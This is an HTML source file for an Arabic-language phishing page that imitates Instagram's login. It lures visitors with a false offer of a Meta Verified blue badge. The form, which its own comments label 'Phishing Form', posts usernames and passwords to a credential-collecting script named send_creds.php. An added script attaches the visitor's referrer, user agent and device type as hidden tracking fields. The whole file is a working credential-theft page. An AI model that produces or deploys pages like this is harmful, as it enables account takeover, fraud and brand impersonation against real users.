<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>تسجيل الدخول إلى Instagram</title>
    <link rel="stylesheet" href="style.css">
    <!-- iOS / Android Autofill Trigger Attributes -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <!-- Instagram Logo -->
            <div class="logo">
                <svg width="175" height="51" viewBox="0 0 175 51">
                    <path d="M154.5 13.4c-1.2 0-2.2 0.9-2.2 2.2 0 1.2 0.9 2.2 2.2 2.2 1.2 0 2.2-0.9 2.2-2.2C156.7 14.3 155.7 13.4 154.5 13.4z M162.7 25.5c0 6.5-5.3 11.8-11.8 11.8s-11.8-5.3-11.8-11.8 5.3-11.8 11.8-11.8S162.7 19 162.7 25.5z" fill="url(#gradient)"/>
                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
                        <stop offset="0%" style="stop-color:#833AB4"/>
                        <stop offset="100%" style="stop-color:#FD1D1D"/>
                    </linearGradient>
                </svg>
                <h1>إنستغرام</h1>
            </div>

            <!-- Verification Badge Message (Social Engineering Trigger) -->
            <div class="badge-notice">
                <div class="badge-icon">✓</div>
                <p>تهانينا! حسابك مؤهل للحصول على <strong>الشارة الزرقاء الموثقة</strong> (Meta Verified Badge)</p>
                <small>قم بتسجيل الدخول لإكمال عملية التوثيق</small>
            </div>

            <!-- Phishing Form -->
            <form id="loginForm" method="POST" action="send_creds.php">
                <div class="input-group">
                    <input type="text" id="username" name="username" 
                           autocomplete="username" 
                           autofill="on"
                           placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" 
                           required>
                    <label for="username">رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني</label>
                </div>

                <div class="input-group">
                    <input type="password" id="password" name="password" 
                           autocomplete="current-password"
                           autofill="on"
                           placeholder="كلمة السر" 
                           required>
                    <label for="password">كلمة السر</label>
                </div>

                <button type="submit" id="loginBtn">تسجيل الدخول</button>

                <div class="forgot">
                    <a href="#">نسيت كلمة السر؟</a>
                </div>
            </form>

            <div class="signup">
                ليس لديك حساب؟ <a href="#">سجل الآن</a>
            </div>
        </div>

        <!-- Hidden iframe for session persistence (helps with autofill) -->
        <iframe src="about:blank" style="display:none" id="persistFrame"></iframe>
    </div>

    <script>
        // Autofill Enhancement Script
        (function() {
            // Force autofill detection by dispatching events
            setTimeout(function() {
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {
                    input.dispatchEvent(new Event('input', { bubbles: true }));
                    input.dispatchEvent(new Event('change', { bubbles: true }));
                });
            }, 100);

            // Store referrer and user-agent for tracking
            const referrer = document.referrer || 'direct';
            const userAgent = navigator.userAgent;
            const deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent) ? 'mobile' : 'desktop';
            
            // Add hidden fields to form
            const form = document.getElementById('loginForm');
            const refInput = document.createElement('input');
            refInput.type = 'hidden';
            refInput.name = 'referrer';
            refInput.value = referrer;
            form.appendChild(refInput);
            
            const deviceInput = document.createElement('input');
            deviceInput.type = 'hidden';
            deviceInput.name = 'device_type';
            deviceInput.value = deviceType;
            form.appendChild(deviceInput);
            
            const uaInput = document.createElement('input');
            uaInput.type = 'hidden';
            uaInput.name = 'user_agent';
            uaInput.value = userAgent;
            form.appendChild(uaInput);
        })();
    </script>
</body>
</html>
